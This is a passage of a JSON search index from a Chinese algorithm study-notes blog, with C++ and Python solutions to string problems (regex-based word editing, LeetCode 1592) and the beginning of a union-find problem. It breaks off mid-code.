Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/5.%E7%89%9B%E5%AE%A2%E7%BD%91_%E5%AD%97%E8%8A%82%E8%B7%B3%E5%8A%A82019_%E8%81%AA%E6%98%8E%E7%9A%84%E7%BC%96%E8%BE%91/#2","text":"\u4f7f\u7528\u6b63\u5219\u8868\u8fbe\u5f0f\u4e2d\u7684\u5b50\u6a21\u5f0f\u5339\u914d\u3002 regex(\"(.)\\\\1+\") \u8868\u793a\u5339\u914d\u4efb\u610f\u5b57\u7b26\u4e24\u6b21\u4ee5\u4e0a\uff0c (.) \u4ee3\u8868\u5339\u914d\u4efb\u610f\u5b57\u7b26\u7684\u4e00\u4e2a\u5b50\u6a21\u5f0f\uff0c \\\\1 \u8868\u793a\u91cd\u590d\u5b50\u6a21\u5f0f1\u4e00\u904d\uff0c + \u8868\u793a\u5339\u914d1\u5230n\u6b21\u3002 \u4f7f\u7528 regex_replace \u53ef\u4ee5\u628a\u6240\u6709 AAA \u66ff\u6362\u6210 AA \u3002 str = regex_replace(str, regex(\"(.)\\\\1+\"), \"$1$1\", regex_constants::match_default); \u540c\u6837\u4e5f\u53ef\u4ee5\u628a\u6240\u6709 AABB \u66ff\u6362\u6210 AAB \u3002 str = regex_replace(str, regex(\"(.)\\\\1(.)\\\\2\"), \"$1$1$2\", regex_constants::match_default);","title":"2. \u9898\u89e3"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/5.%E7%89%9B%E5%AE%A2%E7%BD%91_%E5%AD%97%E8%8A%82%E8%B7%B3%E5%8A%A82019_%E8%81%AA%E6%98%8E%E7%9A%84%E7%BC%96%E8%BE%91/#3","text":"#include <iostream> #include <regex> using namespace std; int main() { string str; // test case int n; cin >> n; // \u5bf9\u6bcf\u4e2a\u6b63\u5219\u8868\u8fbe\u5f0f while (n--) { cin >> str; // \u5339\u914daaa str = regex_replace(str, regex(\"(.)\\\\1+\"), \"$1$1\", regex_constants::match_default); // \u5339\u914daabb str = regex_replace(str, regex(\"(.)\\\\1(.)\\\\2\"), \"$1$1$2\", regex_constants::match_default); cout << str << endl; } } \u521a\u5f00\u59cb\u5199\u4e86\u4e00\u4e2a\u66f4\u590d\u6742\u7684\u7248\u672c\uff0c\u7528 regex_search \u627e\u51fa\u6240\u6709\u5339\u914d\u7684\u5b50\u4e32\u5e76\u8fdb\u884c\u66ff\u6362\u3002 \u867d\u7136 regex_search \u672c\u6765\u53ef\u4ee5\u4e00\u6b21\u627e\u51fa\u6240\u6709\u7684\u5339\u914d\u4e32\uff0c\u4f46\u662f\u8fd9\u91cc\u8981\u8003\u8651\u66ff\u6362\u7684\u4f18\u5148\u7ea7\uff0c\u6240\u4ee5\u6bcf\u66ff\u6362\u4e00\u6b21\u9700\u8981\u91cd\u65b0\u641c\u7d22\uff0c\u4e5f\u5e26\u6765\u4e86\u91cd\u590d\u7684\u5f00\u9500\u3002 #include <iostream> #include <regex> using namespace std; int main() { string str, buffer; size_t size; // test case int n; cin >> n; // \u7ed3\u675f\u7b26\u53f7 sregex_iterator end; // \u5339\u914d\u96c6\u5408 smatch m; // \u5339\u914daabb \u548c aaa string list[] = { \"(([a-z])\\\\2\\\\2)\", \"(([a-z])\\\\2([a-z])\\\\3)\" }; // \u5bf9\u6bcf\u4e2a\u6b63\u5219\u8868\u8fbe\u5f0f while (n--) { cin >> str; for (int i = 0; i < 2; i++) { while (regex_search(str, m, regex(list[i]))) { buffer = m.str(0); size = buffer.size(); // \u66ff\u6362\u5339\u914d\u9879 str = str.replace(str.find(buffer), size, buffer.substr(0, size - 1)); } } cout << str << endl; } } \u725b\u5ba2\u7f51\u4e0a\u8fd8\u6709\u4e00\u4f4d\u7528\u6237\u7684\u9898\u89e3\u4f7f\u7528\u7684\u662f\u72b6\u6001\u673a\uff0c\u770b\u7740\u4e5f\u5f88\u6e05\u6670\u3002 #include<iostream> #include<string> using namespace std; int main() { //\u81ea\u52a8\u673a int n; cin >> n; while (n--) { int state = 0;//\u521d\u59cb\u5316\u4e3a\u72b6\u60010 char cur;//\u5f53\u524d\u5b57\u7b26 string str;//\u76ee\u6807\u5b57\u7b26\u4e32 cin >> str; char last = str[0];//\u521d\u59cb\u5316\u4e3a\u7b2c\u4e00\u4e2a\u5b57\u7b26 string ans = \"\"; ans += str[0];//\u521d\u59cb\u5316 for (int i = 1; i < str.size(); ++i) {//\u5f00\u59cb cur = str[i]; switch (state) { case 0: { if (cur == last)//\u5982\u679c\u662f\u76f8\u7b49\u7684\uff0c\u8fdb\u5165\u72b6\u60011\uff0c\u5426\u5219\u7ee7\u7eed\u72b6\u60010\uff1b state = 1; //\u8fdb\u5165\u72b6\u60011\uff1aAA\u5f62\u5f0f else state = 0; //\u7ee7\u7eed\u72b6\u60010\uff1aAB\u5f62\u5f0f\uff0c\u5373\u6b63\u5e38\u5f62\u5f0f break; } case 1: { if (cur == last) continue;//AAA,\u5ffd\u7565\u5373\u53ef else state = 2;//\u8fdb\u5165\u72b6\u60013\uff1aAAB\u5f62\u5f0f break; } case 2: { if (cur == last) continue;//AABB\uff0c\u5ffd\u7565\u5373\u53ef else state = 0;//AABC\uff0c\u5c31\u662f\u72b6\u60010 break; } default: break; } ans = ans + cur; last = cur; } cout << ans << endl; } return 0; } \u8054\u7cfb\u90ae\u7bb1 \uff1acurren_wong@163.com CSDN \uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e \uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7 \uff1a \u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/6.LeetCode_1592_%E9%87%8D%E6%96%B0%E6%8E%92%E5%88%97%E5%8D%95%E8%AF%8D%E9%97%B4%E7%9A%84%E7%A9%BA%E6%A0%BC/","text":"LeetCode 1592 \u91cd\u65b0\u6392\u5217\u5355\u8bcd\u95f4\u7684\u7a7a\u683c # \u76ee\u5f55 # LeetCode 1592 \u91cd\u65b0\u6392\u5217\u5355\u8bcd\u95f4\u7684\u7a7a\u683c \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Sample Input 1 1.4. Sample Output 1 1.5. Sample Input 2 1.6. Sample Output 2 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Limit # Time Limit: 2000 ms Memory Limit: 131072 kB 1.2. Problem Description # \u7ed9\u4f60\u4e00\u4e2a\u5b57\u7b26\u4e32 text \uff0c\u8be5\u5b57\u7b26\u4e32\u7531\u82e5\u5e72\u88ab\u7a7a\u683c\u5305\u56f4\u7684\u5355\u8bcd\u7ec4\u6210\u3002\u6bcf\u4e2a\u5355\u8bcd\u7531\u4e00\u4e2a\u6216\u8005\u591a\u4e2a\u5c0f\u5199\u82f1\u6587\u5b57\u6bcd\u7ec4\u6210\uff0c\u5e76\u4e14\u4e24\u4e2a\u5355\u8bcd\u4e4b\u95f4\u81f3\u5c11\u5b58\u5728\u4e00\u4e2a\u7a7a\u683c\u3002\u9898\u76ee\u6d4b\u8bd5\u7528\u4f8b\u4fdd\u8bc1 text \u81f3\u5c11\u5305\u542b\u4e00\u4e2a\u5355\u8bcd \u3002 \u8bf7\u4f60\u91cd\u65b0\u6392\u5217\u7a7a\u683c\uff0c\u4f7f\u6bcf\u5bf9\u76f8\u90bb\u5355\u8bcd\u4e4b\u95f4\u7684\u7a7a\u683c\u6570\u76ee\u90fd \u76f8\u7b49 \uff0c\u5e76\u5c3d\u53ef\u80fd \u6700\u5927\u5316 \u8be5\u6570\u76ee\u3002\u5982\u679c\u4e0d\u80fd\u91cd\u65b0\u5e73\u5747\u5206\u914d\u6240\u6709\u7a7a\u683c\uff0c\u8bf7 \u5c06\u591a\u4f59\u7684\u7a7a\u683c\u653e\u7f6e\u5728\u5b57\u7b26\u4e32\u672b\u5c3e \uff0c\u8fd9\u4e5f\u610f\u5473\u7740\u8fd4\u56de\u7684\u5b57\u7b26\u4e32\u5e94\u5f53\u4e0e\u539f text \u5b57\u7b26\u4e32\u7684\u957f\u5ea6\u76f8\u7b49\u3002 \u8fd4\u56de \u91cd\u65b0\u6392\u5217\u7a7a\u683c\u540e\u7684\u5b57\u7b26\u4e32 \u3002 1.3. Sample Input 1 # \u8f93\u5165\uff1atext = \" this is a sentence \" 1.4. Sample Output 1 # \u8f93\u51fa\uff1a\"this is a sentence\" \u89e3\u91ca\uff1a\u603b\u5171\u6709 9 \u4e2a\u7a7a\u683c\u548c 4 \u4e2a\u5355\u8bcd\u3002\u53ef\u4ee5\u5c06 9 \u4e2a\u7a7a\u683c\u5e73\u5747\u5206\u914d\u5230\u76f8\u90bb\u5355\u8bcd\u4e4b\u95f4\uff0c\u76f8\u90bb\u5355\u8bcd\u95f4\u7a7a\u683c\u6570\u4e3a\uff1a9 / (4-1) = 3 \u4e2a\u3002 1.5. Sample Input 2 # \u8f93\u5165\uff1atext = \" practice makes perfect\" 1.6. Sample Output 2 # \u8f93\u51fa\uff1a\"practice makes perfect \" \u89e3\u91ca\uff1a\u603b\u5171\u6709 7 \u4e2a\u7a7a\u683c\u548c 3 \u4e2a\u5355\u8bcd\u30027 / (3-1) = 3 \u4e2a\u7a7a\u683c\u52a0\u4e0a 1 \u4e2a\u591a\u4f59\u7684\u7a7a\u683c\u3002\u591a\u4f59\u7684\u7a7a\u683c\u9700\u8981\u653e\u5728\u5b57\u7b26\u4e32\u7684\u672b\u5c3e\u3002 1.7. Source # LeetCode 1592 \u91cd\u65b0\u6392\u5217\u5355\u8bcd\u95f4\u7684\u7a7a\u683c 2. \u89e3\u8bfb # \u5148\u7edf\u8ba1\u5355\u8bcd\u548c\u7a7a\u683c\u6570\u91cf\uff0c \u7136\u540e\u8ba1\u7b97\u4e2d\u95f4\u548c\u5269\u4e0b\u7684\u7a7a\u683c\u6570\u91cf\u3002 3. \u4ee3\u7801 # class Solution { public: string reorderSpaces(string text) { size_t len = text.size(); int num = 0; string str, gap, ans; vector<string> vt; // \u7edf\u8ba1\u5355\u8bcd\u548c\u7a7a\u683c\u6570\u91cf for (size_t i = 0; i < len; i++) { if (text[i] == ' ') { num++; } else { str.push_back(text[i]); // \u5355\u8bcd\u7ed3\u675f if (i == len - 1 || text[i + 1] == ' ') { vt.push_back(str); str.clear(); } } } // \u8ba1\u7b97\u4e2d\u95f4\u548c\u5269\u4e0b\u7684\u7a7a\u683c\u6570\u91cf size_t numWords = vt.size(); int spaces = numWords == 1 ? num : num / (numWords - 1); int left = num - spaces * (numWords - 1); while (spaces--) gap.push_back(' '); // \u8f93\u51fa for (size_t i = 0; i < numWords; i++) { ans.append(vt[i]); if (i != numWords - 1) { ans.append(gap); } else { while (left--) ans.append(\" \"); } } return ans; } }; Python\u4f1a\u65b9\u4fbf\u5f88\u591a\uff0cPython\u4ee3\u7801\u53c2\u8003\u81ea \u4e00\u4f4d\u9898\u53cb\u7684\u9898\u89e3 \u3002 class Solution: def reorderSpaces(self, text: str) -> str: c = text.count(\" \") li = text.strip().split() if len(li) == 1: return li[0] + \" \" * c s, s1 = divmod(c, len(li) - 1) return (\" \" * s).join(li) + \" \" * s1 \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com CSDN\uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e\uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7\uff1a\u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"6.LeetCode 1592 \u91cd\u65b0\u6392\u5217\u5355\u8bcd\u95f4\u7684\u7a7a\u683c"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/6.LeetCode_1592_%E9%87%8D%E6%96%B0%E6%8E%92%E5%88%97%E5%8D%95%E8%AF%8D%E9%97%B4%E7%9A%84%E7%A9%BA%E6%A0%BC/#leetcode-1592","text":"","title":"LeetCode 1592 \u91cd\u65b0\u6392\u5217\u5355\u8bcd\u95f4\u7684\u7a7a\u683c"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/6.LeetCode_1592_%E9%87%8D%E6%96%B0%E6%8E%92%E5%88%97%E5%8D%95%E8%AF%8D%E9%97%B4%E7%9A%84%E7%A9%BA%E6%A0%BC/#_1","text":"LeetCode 1592 \u91cd\u65b0\u6392\u5217\u5355\u8bcd\u95f4\u7684\u7a7a\u683c \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Sample Input 1 1.4. Sample Output 1 1.5. Sample Input 2 1.6. Sample Output 2 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/6.LeetCode_1592_%E9%87%8D%E6%96%B0%E6%8E%92%E5%88%97%E5%8D%95%E8%AF%8D%E9%97%B4%E7%9A%84%E7%A9%BA%E6%A0%BC/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/6.LeetCode_1592_%E9%87%8D%E6%96%B0%E6%8E%92%E5%88%97%E5%8D%95%E8%AF%8D%E9%97%B4%E7%9A%84%E7%A9%BA%E6%A0%BC/#11-limit","text":"Time Limit: 2000 ms Memory Limit: 131072 kB","title":"1.1. Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/6.LeetCode_1592_%E9%87%8D%E6%96%B0%E6%8E%92%E5%88%97%E5%8D%95%E8%AF%8D%E9%97%B4%E7%9A%84%E7%A9%BA%E6%A0%BC/#12-problem-description","text":"\u7ed9\u4f60\u4e00\u4e2a\u5b57\u7b26\u4e32 text \uff0c\u8be5\u5b57\u7b26\u4e32\u7531\u82e5\u5e72\u88ab\u7a7a\u683c\u5305\u56f4\u7684\u5355\u8bcd\u7ec4\u6210\u3002\u6bcf\u4e2a\u5355\u8bcd\u7531\u4e00\u4e2a\u6216\u8005\u591a\u4e2a\u5c0f\u5199\u82f1\u6587\u5b57\u6bcd\u7ec4\u6210\uff0c\u5e76\u4e14\u4e24\u4e2a\u5355\u8bcd\u4e4b\u95f4\u81f3\u5c11\u5b58\u5728\u4e00\u4e2a\u7a7a\u683c\u3002\u9898\u76ee\u6d4b\u8bd5\u7528\u4f8b\u4fdd\u8bc1 text \u81f3\u5c11\u5305\u542b\u4e00\u4e2a\u5355\u8bcd \u3002 \u8bf7\u4f60\u91cd\u65b0\u6392\u5217\u7a7a\u683c\uff0c\u4f7f\u6bcf\u5bf9\u76f8\u90bb\u5355\u8bcd\u4e4b\u95f4\u7684\u7a7a\u683c\u6570\u76ee\u90fd \u76f8\u7b49 \uff0c\u5e76\u5c3d\u53ef\u80fd \u6700\u5927\u5316 \u8be5\u6570\u76ee\u3002\u5982\u679c\u4e0d\u80fd\u91cd\u65b0\u5e73\u5747\u5206\u914d\u6240\u6709\u7a7a\u683c\uff0c\u8bf7 \u5c06\u591a\u4f59\u7684\u7a7a\u683c\u653e\u7f6e\u5728\u5b57\u7b26\u4e32\u672b\u5c3e \uff0c\u8fd9\u4e5f\u610f\u5473\u7740\u8fd4\u56de\u7684\u5b57\u7b26\u4e32\u5e94\u5f53\u4e0e\u539f text \u5b57\u7b26\u4e32\u7684\u957f\u5ea6\u76f8\u7b49\u3002 \u8fd4\u56de \u91cd\u65b0\u6392\u5217\u7a7a\u683c\u540e\u7684\u5b57\u7b26\u4e32 \u3002","title":"1.2. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/6.LeetCode_1592_%E9%87%8D%E6%96%B0%E6%8E%92%E5%88%97%E5%8D%95%E8%AF%8D%E9%97%B4%E7%9A%84%E7%A9%BA%E6%A0%BC/#13-sample-input-1","text":"\u8f93\u5165\uff1atext = \" this is a sentence \"","title":"1.3. Sample Input 1"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/6.LeetCode_1592_%E9%87%8D%E6%96%B0%E6%8E%92%E5%88%97%E5%8D%95%E8%AF%8D%E9%97%B4%E7%9A%84%E7%A9%BA%E6%A0%BC/#14-sample-output-1","text":"\u8f93\u51fa\uff1a\"this is a sentence\" \u89e3\u91ca\uff1a\u603b\u5171\u6709 9 \u4e2a\u7a7a\u683c\u548c 4 \u4e2a\u5355\u8bcd\u3002\u53ef\u4ee5\u5c06 9 \u4e2a\u7a7a\u683c\u5e73\u5747\u5206\u914d\u5230\u76f8\u90bb\u5355\u8bcd\u4e4b\u95f4\uff0c\u76f8\u90bb\u5355\u8bcd\u95f4\u7a7a\u683c\u6570\u4e3a\uff1a9 / (4-1) = 3 \u4e2a\u3002","title":"1.4. Sample Output 1"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/6.LeetCode_1592_%E9%87%8D%E6%96%B0%E6%8E%92%E5%88%97%E5%8D%95%E8%AF%8D%E9%97%B4%E7%9A%84%E7%A9%BA%E6%A0%BC/#15-sample-input-2","text":"\u8f93\u5165\uff1atext = \" practice makes perfect\"","title":"1.5. Sample Input 2"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/6.LeetCode_1592_%E9%87%8D%E6%96%B0%E6%8E%92%E5%88%97%E5%8D%95%E8%AF%8D%E9%97%B4%E7%9A%84%E7%A9%BA%E6%A0%BC/#16-sample-output-2","text":"\u8f93\u51fa\uff1a\"practice makes perfect \" \u89e3\u91ca\uff1a\u603b\u5171\u6709 7 \u4e2a\u7a7a\u683c\u548c 3 \u4e2a\u5355\u8bcd\u30027 / (3-1) = 3 \u4e2a\u7a7a\u683c\u52a0\u4e0a 1 \u4e2a\u591a\u4f59\u7684\u7a7a\u683c\u3002\u591a\u4f59\u7684\u7a7a\u683c\u9700\u8981\u653e\u5728\u5b57\u7b26\u4e32\u7684\u672b\u5c3e\u3002","title":"1.6. Sample Output 2"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/6.LeetCode_1592_%E9%87%8D%E6%96%B0%E6%8E%92%E5%88%97%E5%8D%95%E8%AF%8D%E9%97%B4%E7%9A%84%E7%A9%BA%E6%A0%BC/#17-source","text":"LeetCode 1592 \u91cd\u65b0\u6392\u5217\u5355\u8bcd\u95f4\u7684\u7a7a\u683c","title":"1.7. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/6.LeetCode_1592_%E9%87%8D%E6%96%B0%E6%8E%92%E5%88%97%E5%8D%95%E8%AF%8D%E9%97%B4%E7%9A%84%E7%A9%BA%E6%A0%BC/#2","text":"\u5148\u7edf\u8ba1\u5355\u8bcd\u548c\u7a7a\u683c\u6570\u91cf\uff0c \u7136\u540e\u8ba1\u7b97\u4e2d\u95f4\u548c\u5269\u4e0b\u7684\u7a7a\u683c\u6570\u91cf\u3002","title":"2. \u89e3\u8bfb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%AD%97%E7%AC%A6%E4%B8%B2/6.LeetCode_1592_%E9%87%8D%E6%96%B0%E6%8E%92%E5%88%97%E5%8D%95%E8%AF%8D%E9%97%B4%E7%9A%84%E7%A9%BA%E6%A0%BC/#3","text":"class Solution { public: string reorderSpaces(string text) { size_t len = text.size(); int num = 0; string str, gap, ans; vector<string> vt; // \u7edf\u8ba1\u5355\u8bcd\u548c\u7a7a\u683c\u6570\u91cf for (size_t i = 0; i < len; i++) { if (text[i] == ' ') { num++; } else { str.push_back(text[i]); // \u5355\u8bcd\u7ed3\u675f if (i == len - 1 || text[i + 1] == ' ') { vt.push_back(str); str.clear(); } } } // \u8ba1\u7b97\u4e2d\u95f4\u548c\u5269\u4e0b\u7684\u7a7a\u683c\u6570\u91cf size_t numWords = vt.size(); int spaces = numWords == 1 ? num : num / (numWords - 1); int left = num - spaces * (numWords - 1); while (spaces--) gap.push_back(' '); // \u8f93\u51fa for (size_t i = 0; i < numWords; i++) { ans.append(vt[i]); if (i != numWords - 1) { ans.append(gap); } else { while (left--) ans.append(\" \"); } } return ans; } }; Python\u4f1a\u65b9\u4fbf\u5f88\u591a\uff0cPython\u4ee3\u7801\u53c2\u8003\u81ea \u4e00\u4f4d\u9898\u53cb\u7684\u9898\u89e3 \u3002 class Solution: def reorderSpaces(self, text: str) -> str: c = text.count(\" \") li = text.strip().split() if len(li) == 1: return li[0] + \" \" * c s, s1 = divmod(c, len(li) - 1) return (\" \" * s).join(li) + \" \" * s1 \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com CSDN\uff1a https://me.csdn.net/qq_41729780 \u77e5\u4e4e\uff1a https://zhuanlan.zhihu.com/c_1225417532351741952 \u516c\u4f17\u53f7\uff1a\u590d\u6742\u7f51\u7edc\u4e0e\u673a\u5668\u5b66\u4e60 \u6b22\u8fce\u5173\u6ce8/\u8f6c\u8f7d\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E5%B9%B6%E6%9F%A5%E9%9B%86/1.%E7%89%9B%E5%AE%A2%E7%BD%91_NC200435_%E6%89%BE%E6%9C%8B%E5%8F%8B/","text":"\u725b\u5ba2\u7f51 NC200435 \u627e\u670b\u53cb # \u76ee\u5f55 # \u725b\u5ba2\u7f51 NC200435 \u627e\u670b\u53cb \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Limit # Time Limit: C/C++ 1\u79d2\uff0c\u5176\u4ed6\u8bed\u8a002\u79d2 Memory Limit: C/C++ 65536K\uff0c\u5176\u4ed6\u8bed\u8a00131072K 1.2. Problem Description # \u2014\u2014\u4f60\u8981\u662f\u613f\u610f\uff0c\u6211\u5c31\u6c38\u8fdc\u5b58\u5728\u3002 \u67d0\u4eba\u7684\u670b\u53cb\u5708\u5b9e\u5728\u662f\u8fc7\u4e8e\u5e9e\u5927\u4e14\u590d\u6742\uff0c\u8981\u5224\u65ad\u4e24\u4e2a\u4eba\u662f\u4e0d\u662f\u670b\u53cb\uff0c\u90a3\u8fd8\u771f\u4e0d\u5bb9\u6613\u3002\u73b0\u7ed9\u51fa\u67d0\u4e2a\u670b\u53cb\u5708\u5173\u7cfb\u56fe\uff0c\u6c42\u4efb\u610f\u7ed9\u51fa\u7684\u4e24\u4e2a\u4eba\u662f\u5426\u662f\u670b\u53cb\u3002\u89c4\u5b9a\uff1a\u5982\u679cx\u548cy\u662f\u670b\u53cb\uff0cy\u548cz\u662f\u670b\u53cb\uff0c\u90a3\u4e48x\u548cz\u4e5f\u662f\u670b\u53cb\u3002\u5982\u679cx\u548cy\u662f\u670b\u53cb\uff0c\u90a3\u4e48x\u7684\u670b\u53cb\u90fd\u662fy\u7684\u670b\u53cb\uff0cy\u7684\u670b\u53cb\u4e5f\u90fd\u662fx\u7684\u670b\u53cb\u3002 1.3. Input # \u7b2c\u4e00\u884c\uff0c\u4e09\u4e2a\u6574\u6570 n,m,p,(n \\le 50000,m \\le 50000,p\\le50000) \uff0c\u5206\u522b\u8868\u793a\u6709n\u4e2a\u4eba\uff0cm\u4e2a\u670b\u53cb\u5173\u7cfb\uff0c\u8be2\u95eep\u5bf9\u670b\u53cb\u5173\u7cfb\u3002 \u4ee5\u4e0bm\u884c\uff1a\u6bcf\u884c\u4e24\u4e2a\u6570 M_i, M_j\uff0c1 \\le M_i, M_j \\le n \uff0c\u8868\u793a M_i \u548c M_j \u5177\u6709\u670b\u53cb\u5173\u7cfb\u3002 \u63a5\u4e0b\u6765 p \u884c\uff1a\u6bcf\u884c\u4e24\u4e2a\u6570 P_i ,P_j ,\u8be2\u95ee P_i ,P_j \u662f\u5426\u5177\u6709\u76c6\u53cb\u5173\u7cfb 1.4. Output # P \u884c\uff0c\u6bcf\u884c\u4e00\u4e2a\u201cYes\u201d\u6216\u201cNo\u201d(\u4e0d\u5305\u542b\u5f15\u53f7)\u3002\u8868\u793a\u7b2c i \u4e2a\u8be2\u95ee\u7684\u7b54\u6848\u4e3a\u201c\u5177\u6709\u201d\u6216\u201c\u4e0d\u5177\u6709\u201d\u670b\u53cb\u5173\u7cfb\u3002 1.5. Sample Input # 6 5 3 1 2 1 5 3 4 5 2 1 3 1 4 2 3 5 6 1.6. Sample Output # Yes Yes No 1.7. Source # \u725b\u5ba2\u7f51 NC200435 \u627e\u670b\u53cb 2. \u89e3\u8bfb # \u4f7f\u7528\u5e76\u67e5\u96c6\u8fdb\u884c\u6c42\u89e3\u3002 \u4ee5\u5982\u4e0b\u8f93\u5165\u4e3a\u4f8b 6 5 3 1 2 1 5 3 4 5 2 1 3 1 4 2 3 5 6 \u7528 group[i] \u5b58\u50a8\u7b2c i \u4e2a\u70b9\u6240\u5728\u7684\u96c6\u56e2\uff0c\u5982\u56fe1\u6240\u793a\u3002 \\text{Figure 1. \u521d\u59cb\u72b6\u6001} \u6bcf\u6b21\u67e5\u8be2\uff0c\u53ea\u8981\u5224\u65ad\u5176\u6839\u8282\u70b9\u662f\u5426\u76f8\u540c\uff0c\u5373\u53ef\u5224\u65ad\u5176\u662f\u5426\u5c5e\u4e8e\u540c\u4e00\u4e2a\u96c6\u56e2\u3002\u5e76\u4e14\uff0c\u6bcf\u6b21\u5bf9 group[i] \u8fdb\u884c\u67e5\u8be2\u8fc7\u540e\uff0c\u8fdb\u884c\u8def\u5f84\u538b\u7f29\uff0c\u4e5f\u5c31\u662f\u5c06\u6839\u8282\u70b9\u8d4b\u503c\u7ed9 group[i] \uff0c\u51cf\u5c11\u4e0b\u4e00\u6b21\u7684\u67e5\u8be2\u65f6\u95f4\u3002\u5982\u56fe2\u6240\u793a\u3002 \\text{Figure 2. \u8def\u5f84\u538b\u7f29} 3. \u4ee3\u7801 # #include <iostream> #include <string.h> using namespace std; const int num = 5e4 + 1; int group[num]; int height[num]; // \u521d\u59cb\u5316 void init_set() { for (int i = 1; i < num; i++) { group[i] = i; // \u6811\u7684\u9ad8\u5ea6 height[i] = 0; } } // \u67e5\u627e int find_set(int x) { // \u8def\u5f84\u538b\u7f29 if (x != group[x]) { group[x] = find_set(group[x]); } return group[x]; } void union_set(int x, int y) { x = find_set(x); y = find_set(y); if (height[x] == height[y]) { // \u5408\u5e76\uff0c\u6811\u7684\u9ad8\u5ea6\u52a01 height[x] = height[x] + 1; group[y] = x; } else { // 